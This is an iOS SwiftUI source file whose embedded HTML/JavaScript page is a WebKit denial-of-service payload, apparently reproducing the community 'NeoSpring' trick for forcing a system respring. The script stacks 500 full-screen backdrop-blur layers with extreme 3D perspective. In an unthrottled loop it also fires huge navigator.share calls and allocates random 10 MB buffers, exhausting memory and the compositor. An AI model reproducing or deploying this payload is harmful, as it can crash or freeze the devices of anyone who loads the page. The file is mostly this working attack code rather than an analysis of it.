import SwiftUI
import WebKit

// Independently authored reproduction of the observed NeoSpring mechanism.
// Mechanism credit: rooootdev, skadz108, neonmodder123; studied in Placard.
// This is a disruptive WebKit/compositor stress attempt, NOT registration IPC.
struct MirsaWallpaperRespringView: UIViewRepresentable {
    let event: (String) -> Void

    func makeCoordinator() -> Coordinator { Coordinator(event: event) }
    func makeUIView(context: Context) -> WKWebView {
        let options = WKWebViewConfiguration()
        options.websiteDataStore = .nonPersistent()
        options.defaultWebpagePreferences.allowsContentJavaScript = true
        let view = WKWebView(frame: .zero, configuration: options)
        view.navigationDelegate = context.coordinator
        view.isOpaque = true
        view.backgroundColor = .black
        view.scrollView.backgroundColor = .black
        view.scrollView.isScrollEnabled = false
        event("REFRESH BEFORE WebKit load · local iframe/compositor stress requested; not proof of respring")
        view.loadHTMLString(Self.document, baseURL: nil)
        return view
    }
    func updateUIView(_ uiView: WKWebView, context: Context) {}
    static func dismantleUIView(_ uiView: WKWebView, coordinator: Coordinator) {
        uiView.stopLoading()
        uiView.loadHTMLString("<html><head><meta charset=\"utf-8\"></head><body></body></html>", baseURL: nil)
        coordinator.event("REFRESH AFTER view dismantled · local page cleared; system respring unverified")
    }
    final class Coordinator: NSObject, WKNavigationDelegate {
        let event: (String) -> Void
        init(event: @escaping (String) -> Void) { self.event = event }
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            event("REFRESH AFTER WebKit navigation finished · payload page loaded only; gallery/respring unverified")
        }
        func webViewWebContentProcessDidTerminate(_ webView: WKWebView) {
            event("REFRESH AFTER WebKit content process terminated · no automatic reload; system respring unverified")
        }
        func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
            event("REFRESH AFTER navigation error · " + error.localizedDescription)
        }
        func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
            event("REFRESH AFTER provisional error · " + error.localizedDescription)
        }
    }
    // Same underlying stages as the reference, not its source text or UI.
    // No remote URLs, credentials, persistent website data, or native file bridge.
    static let document = #"""
    <!doctype html><html><head><meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>body{margin:0;background:black}iframe{position:fixed;inset:0;width:100%;height:100%;border:0}</style>
    </head><body><iframe sandbox="allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-presentation allow-scripts"></iframe><script>
    const surface = document.querySelector('iframe');
    const child = '<!doctype html><html><head><meta charset="utf-8"></head><body style="margin:0;background:black;overflow:hidden"><script>(' + (() => {
      const stage = document.createElement('div');
      Object.assign(stage.style, {perspective:'1px', perspectiveOrigin:'9999999% 9999999%'});
      document.body.append(stage);
      Array.from({length:500}, (_,depth) => {
        const pane = document.createElement('div');
        Object.assign(pane.style, {position:'absolute', width:'100vw', height:'100vh',
          backdropFilter:'blur(100px)', webkitBackdropFilter:'blur(100px)',
          transform:`translate3d(100000px,100000px,${depth}px) rotateY(90deg)`});
        stage.append(pane);
      });
      window.setInterval(() => {
        navigator.share({title:'R', text:'R'.repeat(100000)}).catch(() => {});
        const allocation = new Uint8Array(10 * 1024 * 1024);
        crypto.getRandomValues(allocation);
      }, 0);
    }).toString() + ')();<\/script></body></html>';
    surface.srcdoc = child;
    </script></body></html>
    """#
}
